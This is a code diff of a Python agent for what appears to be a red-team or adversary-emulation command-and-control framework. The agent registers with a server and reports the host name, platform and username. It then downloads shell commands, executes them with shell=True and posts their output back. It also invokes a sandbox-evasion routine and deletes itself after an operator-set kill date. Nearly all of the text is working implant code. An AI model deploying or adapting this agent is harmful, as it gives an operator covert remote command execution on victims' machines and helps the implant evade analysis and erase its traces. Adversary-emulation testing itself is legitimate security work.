@@ -1,29 +1,82 @@
+import configparser
 import datetime
+from getpass import getuser
 import os
 import platform
 import subprocess
 import time
 import urllib3
+from random import randrange
+from pathlib import Path
 
+from urllib3.exceptions import MaxRetryError
 
 http = urllib3.PoolManager()
 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                          ' (KHTML, like Gecko) Chrome/78.0.3904.97 Safa'}
+TIMEOUT = 15
+executed = []
+agent_id = 0
+kill_date_string = ''
+THIS_DIR = Path(__file__).parent
+
+
+def config_file():
+    config = configparser.ConfigParser()
+    global agent_id
+
+    # When operator sets a kill date, kill_date_string will not be 'None'
+    # None was converted to a string
+    if kill_date_string != 'None' and isinstance(kill_date_string, datetime.datetime):
+
+        config.read('config.ini')
+        if 'kill_date' in config['AGENT']:
+
+            # Check if current kill date is different from the one stored so that we change it
+            if config['AGENT']['kill_date'] != kill_date_string:
+                print('[+] Agent received new kill date')
+                print(kill_date_string)
+                config['AGENT'] = {'id': agent_id,
+                                   'kill_date': kill_date_string}
+                with open('config.ini', 'w') as configfile:
+                    config.write(configfile)
+        else:
+            config['AGENT'] = {'id': agent_id,
+                               'kill_date': kill_date_string}
+            with open('config.ini', 'w') as configfile:
+                config.write(configfile)
+
+    # First time to run
+    if not os.path.exists(path=THIS_DIR / 'config.ini'):
+        config['AGENT'] = {'id': agent_id}
+        with open('config.ini', 'w') as configfile:
+            config.write(configfile)
+
+    # Other runs
+    else:
+        config.read('config.ini')
+        if 'kill_date' in config['AGENT']:
+            confirm_kill()
 
 
 def execute_command(command_issued):
-
     cmd = subprocess.Popen(command_issued, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE)
-    success = cmd.stdout.read().decode("utf-8")
-    error = cmd.stderr.read().decode("utf-8")
+    executed.append(datetime.datetime.now())
+    try:
+        success, error = cmd.communicate(timeout=TIMEOUT)
+    except subprocess.TimeoutExpired:
+        cmd.kill()
+        success, error = cmd.communicate()
+
+    success = success.decode("utf-8")
+    error = error.decode("utf-8")
 
     if error is not '':
-        return 'Error: ' + error
+        return 'Error--' + error
 
-    if success == '':
-        success = 'This command ran successfully but produced no console output'
-    return 'Success: ' + success
+    if success == '' or success != '':
+        return 'Success--' + success
 
 
 def get_platform():
@@ -40,87 +93,128 @@ def get_platform():
 
 def register():
     url = 'http://localhost:8000/register_agent'
-    computer_name = execute_command('hostname')
-    req = http.request('POST', url, fields={'id': 8, 'host_name': 'more'}, headers=headers)
-    response = str(req.data.decode('utf-8'))
-    print('Response code: ' + str(req.status))
-    print('Response: ' + response)
+
+    try:
+        req = http.request('POST', url, fields={'id': agent_id, 'hostname': platform.node(), 'platform': get_platform(),
+                                                'plat_version': platform.version(),
+                                                'username': getuser()}, headers=headers)
+        response = str(req.data.decode('utf-8'))
+
+        if req.status == 200:
+            print('[+] ' + response)
+
+    except MaxRetryError:
+        print('[+] Agent failed to register with server after 3 retries')
+        pass
 
 
 def get_techniques():
-    url = 'http://localhost:8000/agent_techniques/5'
-    req = http.request('GET', url, headers=headers)
-    response = str(req.data.decode('utf-8'))
-    # print('Response code: ' + str(req.status))
-    # print('Response: ' + response)
-    response = response.split(',')
-    result = []
+    try:
 
-    for res in response:
-        if res is not '':
-            result.append(res)
-    # print(response)
-    # print(result)
-    return result
+        url = ('http://localhost:8000/agent_techniques/%s' % agent_id)
+        req = http.request('GET', url, headers=headers)
+        response = str(req.data.decode('utf-8'))
+
+        if req.status == 200:
+            response = response.split(',')
+            result = []
+
+            for res in response:
+                if res is not '':
+                    result.append(res)
+
+            return result
+        return
+
+    except MaxRetryError:
+        print('[+] Agent failed to contact server for techniques assigned after 3 retries')
+        pass
 
 
 def download_and_run_commands():
-    results = []
-    result = []
-    single_tech_command = []
-    url = 'http://localhost:8000/agent_tasks/5'
+    try:
+        url = ('http://localhost:8000/agent_tasks/%s' % agent_id)
+        req = http.request('GET', url, headers=headers)
+        response = str(req.data.decode('utf-8'))
 
-    req = http.request('GET', url, headers=headers)
-    response = str(req.data.decode('utf-8'))
-    response_code = req.status
-    # print('Response code: ' + str(req.status))
-    # print('Response: ' + response)
+        if req.status == 200:
+            results = []
+            agent_commands = response.split(';')
 
-    if response_code == 200:
-        # Separates technique's commands into a list separated by ++
-        technique_commands_lists = response.split('++')
-
-        for technique_command_list in technique_commands_lists:
-            if technique_command_list is ',' or technique_command_list is '':
-                continue
-
-            # single_tech_command: [net time, get date] [ run once ]
-            single_tech_command = technique_command_list.split(',')
-
-            # run: [net time, get date]
-            for run in single_tech_command:
-                if run == '':
+            for i, command in enumerate(agent_commands):
+                if command is '':
+                    continue
+                if i == 0:
+                    global kill_date_string
+                    kill_date_string = command
                     continue
 
-                result.append(execute_command(run))
-            results.append(''.join(result))
-            result.clear()
+                results.append(execute_command(command))
 
-    return results
+            return results
+        return
+    except MaxRetryError:
+        print('[+] Agent failed to contact server for tasks to execute after 3 retries')
+        pass
 
 
 def send_output():
-    results = download_and_run_commands()
-    # url = 'http://localhost:8000/agent_tasks/5'
-    techs = get_techniques()
+    agent_tech = get_techniques()
     # http://localhost:8000/agent_techniques/5
+
+    if agent_tech is None:
+        print('[+] Agent sent nothing to the server')
+        return
+
+    std_out = download_and_run_commands()
+    # url = 'http://localhost:8000/agent_tasks/5'
+
+    if std_out is None:
+        print('[+] Agent sent nothing to the server')
+        return
+
     url = 'http://localhost:8000/agent_output'
 
-    # Iterates over list of techniques assigned to an agent_tasks while selecting the respective result or output after
-    # executing that technique
-    for i in range(0, techs.__len__()):
-        # try:
-        req = http.request('POST', url, fields={'id': 5, techs[i]: results[i]}, headers=headers)
-        print('Response code: ' + str(req.status))
-        # time.sleep(4)
-        # except IndexError:
-        #     print('Index error')
+    # Iterates over list of techniques assigned to an agent_tasks while selecting the respective
+    # result or output after executing that technique
+    for i, res in enumerate(agent_tech):
+        try:
 
-    # print(results)
-    # print(techs)
-    # response = str(req.data.decode('utf-8'))
-    # print('Response code: ' + str(req.status))
-    # print('Response: ' + response)
+            req = http.request('POST', url, fields={'id': agent_id, 'tech': agent_tech[i], 'output': std_out[i],
+                                                    'executed': ('%s' % executed[i])}, headers=headers)
+
+            if req.status == 200:
+                print('[+] Agent executed T%s' % agent_tech[i])
+
+            # time.sleep(4)
+
+        except IndexError:
+            print('Index error for %d' % i)
+            pass
+        except MaxRetryError:
+            print('[+] Agent failed to send T%s execution results to server after 3 retries' % str(agent_tech[i]))
+            pass
+
+
+def confirm_kill():
+    global kill_date_string
+    if kill_date_string == '':
+        check = configparser.ConfigParser()
+        check.read('config.ini')
+
+        if 'kill_date' in check['AGENT']:
+            kill_date_string = check['AGENT']['kill_date']
+
+    if kill_date_string == '':
+        return
+
+    now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    if now > kill_date_string:
+        path = Path(__file__)
+        os.remove(path)
+
+        if os.path.exists(path=THIS_DIR / 'config.ini'):
+            os.remove(THIS_DIR / 'config.ini')
 
 
 # def form():
@@ -154,13 +248,19 @@ def sandbox_evasion():
 if __name__ == '__main__':
     print('Agent running')
     sandbox_evasion()
-    # send_output()
-    print(datetime.datetime.now())
-    techs = get_techniques()
-    print(techs)
-    print(datetime.datetime.now())
-    results = download_and_run_commands()
-    print(results)
-    print(datetime.datetime.now())
 
-
+    # Getting agent id
+    if not os.path.exists(path=THIS_DIR / 'config.ini'):
+        agent_id = randrange(500)
+    else:
+        agent_config = configparser.ConfigParser()
+        agent_config.read('config.ini')
+        agent_id = agent_config['AGENT']['id']
+    # print(agent_id)
+    # techs = get_techniques()
+    # print(techs)
+    # results = download_and_run_commands()
+    # print(results)
+    register()
+    send_output()
+    config_file()
